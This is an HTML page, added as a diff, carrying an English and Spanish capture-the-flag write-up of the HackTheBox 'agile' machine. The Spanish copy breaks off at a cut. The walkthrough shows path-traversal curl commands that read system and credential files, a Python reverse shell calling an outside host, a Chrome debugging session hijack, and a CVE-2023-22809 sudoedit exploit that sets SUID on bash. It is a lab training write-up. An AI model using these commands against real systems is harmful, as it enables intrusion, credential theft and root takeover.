@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>agile | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">agile</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Flask-based password vault application on port 80 with debug mode inadvertently enabled. Through error messages, I discovered the application was using Werkzeug in debug mode and had a Local File Inclusion (LFI) vulnerability in the download functionality.</p>
+                    
+                    <p>By exploiting the LFI, I gathered system information necessary to calculate the Werkzeug debugger PIN. With access to the interactive debugger console, I executed Python code to gain a reverse shell as <code>www-data</code>. Database credentials found in configuration files allowed lateral movement to user <code>corum</code>.</p>
+                    
+                    <p>Further enumeration revealed a testing environment running Selenium with Chrome in debug mode. By connecting to the Chrome debugging port through local port forwarding and hijacking an active testing session, I extracted credentials for user <code>edwards</code> from the vault interface.</p>
+                    
+                    <p>The <code>edwards</code> user had <code>sudoedit</code> privileges to edit specific files as <code>dev_admin</code>. The system was running sudo version 1.9.9, which is vulnerable to CVE-2023-22809, allowing arbitrary file editing through the <code>EDITOR</code> environment variable. I exploited this to modify <code>/app/venv/bin/activate</code>, which was automatically sourced by all users including root via <code>/etc/bash.bashrc</code>. By injecting a command to set the SUID bit on <code>/bin/bash</code>, I achieved root access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Flask LFI vulnerability, Werkzeug debugger PIN generation and exploitation, Selenium Chrome remote debugging hijack, CVE-2023-22809 (sudoedit arbitrary file write), Python virtual environment abuse for privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image7.png" alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>
+
+                <p>The scan reveals SSH on port 22 and HTTP on port 80. I add <code>superpass.htb</code> to my <code>/etc/hosts</code> file to access the web application.</p>
+
+                <h2>Web Enumeration - SuperPass Password Vault</h2>
+                <p>The web application is a password vault service with registration and login functionality. When attempting to register, I encounter an interesting error:</p>
+                <p><img src="./media/image3.png" alt="Error message showing database connection issues with verbose debugging information" /></p>
+
+                <p>The application appears to have debug mode enabled, causing it to dump excessive information when encountering errors. The database connection intermittently fails, triggering these verbose error messages.</p>
+
+                <h3>Werkzeug Debugger Discovery</h3>
+                <p>While testing with Burp Suite, I notice additional information in the response headers that wasn't visible in the browser. The error page contains references to the Werkzeug debugger:</p>
+
+                <pre><code class="language-html">// Werkzeug Debugger
+&lt;link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"&gt;
+&lt;link rel="shortcut icon" href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png"&gt;
+&lt;script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+var CONSOLE_MODE = false,
+    EVALEX = true,
+    EVALEX_TRUSTED = false,
+    SECRET = "kCIewyRYkkhJTUw6qNHD";
+&lt;/script&gt;</code></pre>
+
+                <p>The Werkzeug interactive debugger is accessible, but it requires a PIN to use. The <code>SECRET</code> value found here is not the PIN itself, but it confirms that Werkzeug is one of the technologies powering this application.</p>
+
+                <p>From the error stacktraces, I also extract valuable information about the application structure:</p>
+                <ul>
+                    <li>Application path: <code>/app/app/superpass/</code></li>
+                    <li>Main app file: <code>/app/app.py</code> or <code>/app/app/superpass/app.py</code></li>
+                    <li>Python version: <code>python3.10</code></li>
+                </ul>
+
+                <h2>Local File Inclusion Discovery</h2>
+                <p>While exploring the application with Burp Suite, I discover a Local File Inclusion (LFI) vulnerability in the download functionality. I can read arbitrary files from the system:</p>
+
+                <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../../../../../../../../../../../../../../../../etc/passwd -H "Cookie: session={jwt}"</code></pre>
+
+                <p>This reveals several user accounts on the system:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+(...)
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+(...)
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash</code></pre>
+
+                <h3>Gathering System Information</h3>
+                <p>Using the LFI vulnerability, I begin gathering information needed to calculate the Werkzeug debugger PIN. By reading <code>/proc/self/environ</code>, I find a configuration file path:</p>
+                <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../proc/self/environ -H "Cookie: session={jwt}"</code></pre>
+                <pre><code class="language-plaintext">CONFIG_PATH=/app/config_prod.json</code></pre>
+
+                <p>Reading this configuration file reveals MySQL credentials:</p>
+                <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../app/config_prod.json -H "Cookie: session={jwt}"</code></pre>
+                <pre><code class="language-json">{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}</code></pre>
+
+                <p>These credentials don't work for SSH with any of the discovered users, but they'll be useful once I gain shell access.</p>
+
+                <h2>Werkzeug PIN Generation</h2>
+                <p>With LFI access and the Werkzeug debugger available, I can gather all the information needed to calculate the PIN. The PIN generation algorithm requires specific system values that I extract through the LFI vulnerability:</p>
+
+                <ul>
+                    <li><strong>MAC address</strong> (<code>/sys/class/net/eth0/address</code>): <code>00:50:56:94:f1:6a</code></li>
+                    <li><strong>Machine ID</strong> (<code>/etc/machine-id</code>): <code>ed5b159560f54721827644bc9b220d00</code></li>
+                    <li><strong>User running the app</strong> (<code>/proc/self/environ</code>): <code>www-data</code></li>
+                    <li><strong>Python app path</strong> (from error messages): <code>/app/venv/lib/python3.10/site-packages/flask/app.py</code></li>
+                    <li><strong>cgroup</strong> (<code>/proc/self/cgroup</code>): <code>0::/system.slice/superpass.service</code></li>
+                    <li><strong>Module name</strong> (typically <code>flask.app</code> or <code>werkzeug.debug</code>): <code>flask.app</code></li>
+                    <li><strong>App name</strong> (from error messages): <code>wsgi_app</code></li>
+                </ul>
+
+                <p>By examining the Werkzeug source code at <code>/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py</code> through the LFI, I confirm that the cgroup value is indeed necessary for this version:</p>
+                <p><img src="./media/image8.png" alt="Werkzeug source code showing PIN generation algorithm that uses cgroup information" /></p>
+
+                <p>Using these values, I create a script to generate the PIN. The HackTricks guide on Werkzeug exploitation provides useful reference material: <a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug">https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug</a></p>
+
+                <p>The generated PIN is: <code>101-676-570</code></p>
+
+                <h2>Initial Access - Werkzeug Console Exploitation</h2>
+                <p>With the PIN, I can access the Werkzeug interactive debugger console, which allows me to execute arbitrary Python code. I use this to establish a reverse shell:</p>
+
+                <pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.18",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</code></pre>
+
+                <p>This grants me shell access as <code>www-data</code>. Interestingly, the shell prompt shows <code>(venv)</code>, indicating the Python virtual environment is active. This detail will become relevant later during privilege escalation.</p>
+
+                <h3>Database Access and Lateral Movement</h3>
+                <p>With shell access, I can now use the MySQL credentials found earlier to access the database:</p>
+                <pre><code class="language-bash">mysql -u superpassuser -p superpass</code></pre>
+
+                <p>Examining the database tables, I find credentials for user <code>corum</code>:</p>
+                <pre><code class="language-plaintext">corum:5db7caa1d13cc37c9fc2</code></pre>
+
+                <p>These credentials work for SSH, allowing me to access the machine as <code>corum</code>.</p>
+
+                <h2>Internal Port Enumeration</h2>
+                <p>Running a local port scan reveals several interesting services listening on localhost:</p>
+                <p><img src="./media/image2.png" alt="Netstat output showing local ports including MySQL, Flask apps, and Chrome debugging ports" /></p>
+
+                <ul>
+                    <li>Ports <code>3306</code> and <code>33060</code>: MySQL</li>
+                    <li>Port <code>5000</code>: The production Flask application (accessible via port 80)</li>
+                    <li>Port <code>5555</code>: The testing Flask application, running as user <code>runner</code></li>
+                    <li>Ports <code>35519</code> and <code>41829</code>: Chrome debugging ports, used by Selenium for automated testing</li>
+                </ul>
+
+                <p><img src="./media/image6.png" alt="Process listing showing Chrome and Selenium processes running as the runner user" /></p>
+
+                <h3>Testing Automation Discovery</h3>
+                <p>Using <code>pspy64</code> to monitor processes, I observe that user <code>runner</code> periodically executes automated tests:</p>
+                <pre><code class="language-bash">/bin/bash /app/test_and_update.sh</code></pre>
+
+                <p>This script runs functional tests on the testing environment. Notably, the LFI vulnerability doesn't exist in the testing version, and debug mode is disabled there.</p>
+
+                <p>The tests use credentials stored in a file I cannot read:</p>
+                <pre><code class="language-bash">cat /app/app-testing/tests/functional/creds.txt</code></pre>
+                <pre><code class="language-plaintext">cat: tests/functional/creds.txt: Permission denied</code></pre>
+
+                <h2>Chrome Remote Debugging Hijack</h2>
+                <p>To access the testing environment and Chrome debugging interface from my machine, I set up local port forwarding for ports <code>5555</code> and <code>41829</code>:</p>
+                <pre><code class="language-bash">ssh -L 5555:localhost:5555 -L 41829:localhost:41829 corum@superpass.htb</code></pre>
+
+                <p>I then open Chromium on my machine and navigate to <code>chrome://inspect</code>. I add <code>localhost:41829</code> as a discovery target:</p>
+                <p><img src="./media/image4.png" alt="Chrome inspect page showing the configuration to add a remote debugging target" /></p>
+                <p><img src="./media/image5.png" alt="Chrome showing the discovered remote debugging session with inspect button" /></p>
+
+                <p>By clicking "inspect," I can view the automated testing session in real-time. The tests include a lengthy one that makes the interface appear frozen, but I can navigate manually during the pauses between test runs.</p>
+
+                <h3>Credential Extraction</h3>
+                <p>I manually navigate to <code>/vault</code> in the hijacked Chrome session and observe the automated tests interacting with the interface. This allows me to extract credentials that are being tested:</p>
+                <p><img src="./media/image1.png" alt="Vault interface showing credentials for user edwards" /></p>
+
+                <pre><code class="language-plaintext">edwards:d07867c6267dcb5df0af</code></pre>
+
+                <p>These credentials work for SSH, granting me access as user <code>edwards</code>.</p>
+
+                <h2>Privilege Escalation Path - Sudoedit Enumeration</h2>
+                <p>Checking sudo privileges for the <code>edwards</code> user:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt</code></pre>
+
+                <p>The user can edit two specific files as <code>dev_admin</code> using <code>sudoedit</code> (which is equivalent to <code>sudo -e</code>).</p>
+
+                <p>Reading the credentials file reveals test credentials that only work for the testing application:</p>
+                <pre><code class="language-plaintext">edwards:1d7ffjwrx#$d6qn!9nndqgde4</code></pre>
+
+                <p>These credentials don't provide access to any system accounts.</p>
+
+                <h2>CVE-2023-22809 - Sudoedit Arbitrary File Write</h2>
+                <p>Checking the sudo version reveals a vulnerable installation:</p>
+                <pre><code class="language-bash">sudo --version</code></pre>
+                <pre><code class="language-plaintext">Sudo version 1.9.9</code></pre>
+
+                <p>This version is vulnerable to CVE-2023-22809, which allows editing arbitrary files by manipulating the <code>EDITOR</code> environment variable. The vulnerability is well-documented in this PDF: <a href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf</a></p>
+
+                <p>The basic proof-of-concept demonstrates the vulnerability:</p>
+                <pre><code class="language-bash">EDITOR='nano -- /etc/shadow' sudoedit -u dev_admin /app/config_test.json</code></pre>
+                <pre><code class="language-plaintext">sudoedit: /etc/shadow: Permission denied
+sudoedit: -- unchanged
+sudoedit: /app/config_test.json unchanged</code></pre>
+
+                <p>While I can't edit <code>/etc/shadow</code> because <code>dev_admin</code> doesn't have permissions, the exploit technique is confirmed. The key is finding a file that <code>dev_admin</code> can write to that will lead to privilege escalation.</p>
+
+                <h3>Identifying Target Files</h3>
+                <p>I search for files owned by or writable by <code>dev_admin</code>:</p>
+                <pre><code class="language-bash">find / -user dev_admin 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/home/dev_admin
+/app/app-testing/tests/functional/creds.txt
+/app/config_test.json
+/app/config_prod.json</code></pre>
+
+                <pre><code class="language-bash">find / -group dev_admin 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/home/dev_admin
+/app/venv
+/app/venv/bin
+/app/venv/bin/activate
+/app/venv/bin/Activate.ps1
+/app/venv/bin/activate.fish
+/app/venv/bin/activate.csh</code></pre>
+
+                <p>The virtual environment activation scripts are owned by the <code>dev_admin</code> group and are writable. The file <code>/app/venv/bin/activate</code> is particularly interesting because it's executed when the virtual environment is activated.</p>
+
+                <h3>Virtual Environment Abuse</h3>
+                <p>Recalling that my initial shell as <code>www-data</code> automatically showed <code>(venv)</code> in the prompt, I investigate how this happens. Examining the global bash configuration reveals the answer:</p>
+                <pre><code class="language-bash">tail /etc/bash.bashrc</code></pre>
+                <pre><code class="language-bash"># all users will want the env associated with this application
+source /app/venv/bin/activate</code></pre>
+
+                <p>Every user, including root, automatically sources the virtual environment activation script when starting a bash shell. This means I can inject commands into <code>/app/venv/bin/activate</code> that will be executed by any user who logs in or spawns a new bash shell.</p>
+
+                <h2>Root Access - SUID Bash</h2>
+                <p>I exploit CVE-2023-22809 to edit <code>/app/venv/bin/activate</code> and inject a command to set the SUID bit on <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">EDITOR='nano -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json</code></pre>
+
+                <p>In the nano editor, I add this line to the activation script:</p>
+                <pre><code class="language-bash">chmod u+s /bin/bash</code></pre>
+
+                <p>After saving and waiting for root to spawn a new bash shell (which happens periodically through various system tasks), I check the permissions on <code>/bin/bash</code>:</p>
+                <pre><code class="language-bash">ls -la /bin/bash</code></pre>
+                <pre><code class="language-plaintext">-rwsr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bash</code></pre>
+
+                <p>The SUID bit is now set. I can spawn a privileged shell and access the root flag:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>With root access achieved, I can retrieve the final flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación de bóveda de contraseñas basada en Flask en el puerto 80 con el modo debug activado inadvertidamente. A través de mensajes de error, descubrí que la aplicación usaba Werkzeug en modo debug y tenía una vulnerabilidad de Local File Inclusion (LFI) en la funcionalidad de descarga.</p>
+                    
+                    <p>Explotando el LFI, recopilé información del sistema necesaria para calcular el PIN del debugger de Werkzeug. Con acceso a la consola interactiva del debugger, ejecuté código Python para obtener una reverse shell como <code>www-data</code>. Las credenciales de base de datos encontradas en archivos de configuración permitieron movimiento lateral al usuario <code>corum</code>.</p>
+                    
+                    <p>La enumeración adicional reveló un entorno de testing ejecutando Selenium con Chrome en modo debug. Conectándome al puerto de debugging de Chrome mediante local port forwarding y secuestrando una sesión de testing activa, extraje credenciales del usuario <code>edwards</code> desde la interfaz de la bóveda.</p>
+                    
+                    <p>El usuario <code>edwards</code> tenía privilegios <code>sudoedit</code> para editar archivos específicos como <code>dev_admin</code>. El sistema ejecutaba sudo versión 1.9.9, vulnerable a CVE-2023-22809, permitiendo edición arbitraria de archivos mediante la variable de entorno <code>EDITOR</code>. Explotando esto, modifiqué <code>/app/venv/bin/activate</code>, que era automáticamente ejecutado por todos los usuarios incluyendo root mediante <code>/etc/bash.bashrc</code>. Inyectando un comando para establecer el bit SUID en <code>/bin/bash</code>, conseguí acceso root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Vulnerabilidad LFI en Flask, generación y explotación del PIN del debugger de Werkzeug, secuestro de debugging remoto de Chrome con Selenium, CVE-2023-22809 (escritura arbitraria de archivos con sudoedit), abuso de entorno virtual Python para escalada de privilegios.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image7.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y HTTP en el puerto 80. Añado <code>superpass.htb</code> a mi archivo <code>/etc/hosts</code> para acceder a la aplicación web.</p>
+
+                <h2>Enumeración Web - Bóveda de Contraseñas SuperPass</h2>
+                <p>La aplicación web es un servicio de bóveda de contraseñas con funcionalidad de registro e inicio de sesión. Al intentar registrarme, me encuentro con un error interesante:</p>
+                <p><img src="./media/image3.png" alt="Mensaje de error mostrando problemas de conexión a la base de datos con información de debugging verbosa" /></p>
+
+                <p>La aplicación parece tener el modo debug activado, lo que hace que vuelque información excesiva cuando encuentra errores. La conexión a la base de datos falla intermitentemente, desencadenando estos mensajes de error verbosos.</p>
+
+                <h3>Descubrimiento del Debugger de Werkzeug</h3>
+                <p>Mientras pruebo con Burp Suite, noto información adicional en las cabeceras de respuesta que no era visible en el navegador. La página de error contiene referencias al debugger de Werkzeug:</p>
+
+                <pre><code class="language-html">// Werkzeug Debugger
+&lt;link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"&gt;
+&lt;link rel="shortcut icon" href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png"&gt;
+&lt;script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+var CONSOLE_MODE = false,
+    EVALEX = true,
+    EVALEX_TRUSTED = false,
+    SECRET = "kCIewyRYkkhJTUw6qNHD";
+&lt;/script&gt;</code></pre>
+
+                <p>El debugger interactivo de Werkzeug es accesible, pero requiere un PIN para usarlo. El valor <code>SECRET</code> encontrado aquí no es el PIN en sí, pero confirma que Werkzeug es una de las tecnologías que potencia esta aplicación.</p>
+
+                <p>De las trazas de errores, también extraigo información valiosa sobre la estructura de la aplicación:</p>
+                <ul>
+                    <li>Ruta de la aplicación: <code>/app/app/superpass/</code></li>
+                    <li>Archivo principal de la app: <code>/app/app.py</code> o <code>/app/app/superpass/app.py</code></li>
+                    <li>Versión de Python: <code>python3.10</code></li>
+                </ul>
+
+                <h2>Descubrimiento de Local File Inclusion</h2>
+                <p>Mientras exploro la aplicación con Burp Suite, descubro una vulnerabilidad de Local File Inclusion (LFI) en la funcionalidad de descarga. Puedo leer archivos arbitrarios del sistema:</p>
+
+                <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../../../../../../../../../../../../../../../../etc/passwd -H "Cookie: session={jwt}"</code></pre>
+
+                <p>Esto revela varias cuentas de usuario en el sistema:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+(...)
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+(...)
+runner:x:1001:1001::/app/app-testing/:/bin/sh
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash</code></pre>
+
+                <h3>Recopilando Información del Sistema</h3>
+                <p>Usando la vulnerabilidad LFI, comienzo a recopilar información necesaria para calcular el PIN del debugger de Werkzeug. Leyendo <code>/proc/self/environ</code>, encuentro una ruta de archivo de configuración:</p>
+                <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../proc/self/environ -H "Cookie: session={jwt}"</code></pre>
+                <pre><code class="language-plaintext">CONFIG_PATH=/app/config_prod.json</code></pre>
+
+                <p>Leyendo este archivo de configuración revela credenciales de MySQL:</p>
+                <pre><code class="language-bash">curl http://superpass.htb/download?fn=../../../app/config_prod.json -H "Cookie: session={jwt}"</code></pre>
+                <pre><code class="language-json">{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}</code></pre>
+
+                <p>Estas credenciales no funcionan para SSH con ninguno de los usuarios descubiertos, pero serán útiles una vez que obtenga acceso shell.</p>
+
+                <h2>Generación del PIN de Werkzeug</h2>
+                <p>Con acceso LFI y el debugger de Werkzeug disponible, puedo recopilar toda la información necesaria para calcular el PIN. El algoritmo de generación del PIN requiere valores específicos del sistema que extraigo mediante la vulnerabilidad LFI:</p>
+
+                <ul>
+                    <li><strong>Dirección MAC</strong> (<code>/sys/class/net/eth0/address</code>): <code>00:50:56:94:f1:6a</code></li>
+                    <li><strong>Machine ID</strong> (<code>/etc/machine-id</code>): <code>ed5b159560f54721827644bc9b220d00</code></li>
+                    <li><strong>Usuario ejecutando la app</strong> (<code>/proc/self/environ</code>): <code>www-data</code></li>
+                    <li><strong>Ruta de la app Python</strong> (de mensajes de error): <code>/app/venv/lib/python3.10/site-packages/flask/app.py</code></li>
+                    <li><strong>cgroup</strong> (<code>/proc/self/cgroup</code>): <code>0::/system.slice/superpass.service</code></li>
+                    <li><strong>Nombre del módulo</strong> (típicamente <code>flask.app</code> o <code>werkzeug.debug</code>): <code>flask.app</code></li>
+                    <li><strong>Nombre de la app</strong> (de mensajes de error): <code>wsgi_app</code></li>
+                </ul>
+
+                <p>Examinando el código fuente de Werkzeug en <code>/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py</code> mediante el LFI, confirmo que el valor cgroup es efectivamente necesario para esta versión:</p>
+                <p><img src="./media/image8.png" alt="Código fuente de Werkzeug mostrando el algoritmo de generación del PIN que usa información de cgroup" /></p>
+
+                <p>Usando estos valores, creo un script para generar el PIN. La guía de HackTricks sobre explotación de Werkzeug proporciona material de referencia útil: <a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug">https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/werkzeug</a></p>
+
+                <p>El PIN generado es: <code>101-676-570</code></p>
+
+                <h2>Acceso Inicial - Explotación de la Consola Werkzeug</h2>
+                <p>Con el PIN, puedo acceder a la consola interactiva del debugger de Werkzeug, que me permite ejecutar código Python arbitrario. Uso esto para establecer una reverse shell:</p>
+
+                <pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.18",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</code></pre>
+
+                <p>Esto me otorga acceso shell como <code>www-data</code>. Curiosamente, el prompt de la shell muestra <code>(venv)</code>, indicando que el entorno virtual Python está activo. Este detalle será relevante más adelante durante la escalada de privilegios.</p>
+
+                <h3>Acceso a la Base de Datos y Movimiento Lateral</h3>
+                <p>Con acceso shell, ahora puedo usar las credenciales de MySQL encontradas anteriormente para acceder a la base de datos:</p>
+                <pre><code class="language-bash">mysql -u superpassuser -p superpass</code></pre>
+
+                <p>Examinando las tablas de la base de datos, encuentro credenciales para el usuario <code>corum</code>:</p>
+                <pre><code class="language-plaintext">corum:5db7caa1d13cc37c9fc2</code></pre>
+
+                <p>Estas credenciales funcionan para SSH, permitiéndome acceder a la máquina como <code>corum</code>.</p>
+
+                <h2>Enumeración de Puertos Internos</h2>
+                <p>Ejecutando un escaneo de puertos locales revela varios servicios interesantes escuchando en localhost:</p>
+                <p><img src="./media/image2.png" alt="Salida de netstat mostrando puertos locales incluyendo MySQL, apps Flask y puertos de debugging de Chrome" /></p>
+
+                <ul>
+                    <li>Puertos <code>3306</code> y <code>33060</code>: MySQL</li>
+                    <li>Puerto <code>5000</code>: La aplicación Flask de producción (accesible mediante el puerto 80)</li>
+                    <li>Puerto <code>5555</code>: La aplicación Flask de testing, ejecutándose como usuario <code>runner</code></li>
+                    <li>Puertos <code>35519</code> y <code>41829</code>: Puertos de debugging de Chrome, usados por Selenium para testing automatizado</li>
+                </ul>
+
+                <p><img src="./media/image6.png" alt="Listado de procesos mostrando procesos de Chrome y Selenium ejecutándose como el usuario runner" /></p>
+
+                <h3>Descubrimiento de Automatización de Testing</h3>
+                <p>Usando <code>pspy64</code> para monitorizar procesos, observo que el usuario <code>runner</code> ejecuta periódicamente tests automatizados:</p>
+                <pre><code class="language-bash">/bin/bash /app/test_and_update.sh</code></pre>
+
+                <p>Este script ejecuta tests funcionales en el entorno de testing. Notablemente, la vulnerabilidad LFI no existe en la versión de testing, y el modo debug está deshabilitado ahí.</p>
+
+                <p>Los tests usan credenciales almacenadas en un archivo que no puedo leer:</p>
+                <pre><code class="language-bash">cat /app/app-testing/tests/functional/creds.txt</code></pre>
+                <pre><code class="language-plaintext">cat: tests/functional/creds.txt: Permission denied</code></pre>
+
+                <h2>Secuestro de Debugging Remoto de Chrome</h2>
+                <p>Para acceder al entorno de testing y la interfaz de debugging de Chrome desde mi máquina, configuro local port forwarding para los puertos <code>5555</code> y <code>41829</code>:</p>
+                <pre><code class="language-bash">ssh -L 5555:localhost:5555 -L 41829:localhost:41829 corum@superpass.htb</code></pre>
+
+                <p>Luego abro Chromium en mi máquina y navego a <code>chrome://inspect</code>. Añado <code>localhost:41829</code> como objetivo de descubrimiento:</p>
+                <p><img src="./media/image4.png" alt="Página de chrome inspect mostrando la configuración para añadir un objetivo de debugging remoto" /></p>
+                <p><img src="./media/image5.png" alt="Chrome mostrando la sesión de debugging remoto descubierta con el botón inspect" /></p>
+
+                <p>Haciendo clic en "inspect", puedo ver la sesión de testing automatizada en tiempo real. Los tests incluyen uno largo que hace que la interfaz parezca congelada, pero puedo navegar manualmente durante las pausas entre ejecuciones de test.</p>
+
+                <h3>Extracción de Credenciales</h3>
+                <p>Navego manualmente a <code>/vault</code> en la sesión secuestrada de Chrome y observo los tests automatizados interactuando con la interfaz. Esto me permite extraer credenciales que están siendo testeadas:</p>
+                <p><img src="./media/image1.png" alt="Interfaz de la bóveda mostrando credenciales para el usuario edwards" /></p>
+
+                <pre><code class="language-plaintext">edwards:d07867c6267dcb5df0af</code></pre>
+
+                <p>Estas credenciales funcionan para SSH, otorgándome acceso como usuario <code>edwards</code>.</p>
+
+                <h2>Ruta de Escalada de Privilegios - Enumeración de Sudoedit</h2>
+                <p>Comprobando privilegios sudo para el usuario <code>edwards</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt</code></pre>
+
+                <p>El usuario puede editar dos archivos específicos como <code>dev_admin</code> usando <code>sudoedit</code> (que es equivalente a <code>sudo -e</code>).</p>
+
+                <p>Leyendo el archivo de credenciales revela credenciales de test que solo funcionan para la aplicación de testing:</p>
+                <pre><code class="language-plaintext">edwards:1d7ffjwrx#$d6qn!9nndqgde4</code></pre>
+
+                <p>Estas credenciales no proporcionan acceso a ninguna cuenta del sistema.</p>
+
+                <h2>CVE-2023-22809 - Escritura Arbitraria de Archivos con Sudoedit</h2>
+                <p>Comprobando la versión de sudo revela una instalación vulnerable:</p>
+                <pre><code class="language-bash">sudo --version</code></pre>
+                <pre><code class="language-plaintext">Sudo version 1.9.9</code></pre>
+
+                <p>Esta versión es vulnerable a CVE-2023-22809, que permite editar archivos arbitrarios manipulando la variable de entorno <code>EDITOR</code>. La vulnerabilidad está bien documentada en este PDF: <a href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf</a></p>
+
+                <p>La prueba de concepto básica demuestra la vulnerabilidad:</p>
+                <pre><code class="language-bash">EDITOR='nano -- /etc/shadow' sudoedit -u dev_admin /app/config_test.json</code></pre>
+                <pre><code class="language-plaintext">sudoedit: /etc/shadow: Permission denied
+sudoedit: -- unchanged
+sudoedit: /app/config_test.json unchanged</code></pre>
+
+                <p>Aunque no puedo editar <code>/etc/shadow</code> porque <code>dev_admin</code> no tiene permisos, la técnica del exploit está confirmada. La clave es encontrar un archivo al que <code>dev_admin</code> pueda escribir que conduzca a la escalada de privilegios.</p>
+
+                <h3>Identificando Archivos Objetivo</h3>
+                <p>Busco archivos poseídos por o escribibles por <code>dev_admin</code>:</p>
+                <pre><code class="language-bash">find / -user dev_admin 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/home/dev_admin
+/app/app-testing/tests/functional/creds.txt
+/app/config_test.json
